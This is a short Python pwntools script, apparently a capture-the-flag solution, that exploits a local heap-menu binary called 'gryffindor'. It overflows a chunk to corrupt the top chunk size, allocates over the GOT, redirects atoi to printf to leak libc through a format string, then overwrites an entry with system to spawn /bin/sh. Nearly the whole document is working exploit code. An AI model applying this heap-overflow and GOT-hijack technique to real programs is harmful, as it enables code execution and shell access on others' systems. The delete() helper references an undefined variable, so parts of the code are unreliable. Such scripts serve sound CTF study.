from pwn import *
import time
p = process('./gryffindor', env = {"LD_PRELOAD":"./libc.so.6"})

def add(idx,size):
    p.sendlineafter(">> ","1")
    p.sendlineafter("Enter size of input\n",str(size))
    p.sendlineafter("Enter index\n",str(idx))

def delete():
    p.sendlineafter(">> ","2")
    p.sendlineafter("Enter index\n",str(idx))

def edit(idx,size,content):
    p.sendlineafter(">> ","3")
    p.sendlineafter("Enter index\n",str(idx))
    p.sendlineafter("Enter size\n",str(size))
    p.sendline(str(content))

def nice():
    p.sendlineafter(">> ","1337")

free_got = 0x0000000000602018
atoi = 0x0000000000602068
printf_plt = 0x00000000004006c0
exit = 0x0000000000602070
alarm = 0x0000000000602038
add(0,256)
#gdb.attach(p)
edit(0,272,"a"*256 + "b"*8 + "\xff"*8)
nice()
leak = int(p.recvline(),16)
print hex(leak)
top_chunk = leak + 528
print hex(top_chunk)
size = atoi - top_chunk - 0x30
print hex(size)
add(1,size)
add(2,256)
edit(2,32,"a"*24 + p64(printf_plt))
edit(1,"%p"*3,'')
leak = int(p.recvline()[17:].strip(),16)
system = leak - 0xb1ea0
print hex(system)
p.sendline("aa")
p.sendlineafter("Enter index\n",'a')
p.sendlineafter("Enter size\n","b"*33)
p.sendline("/bin/sh"+"a"*15 + p64(system))
p.interactive()
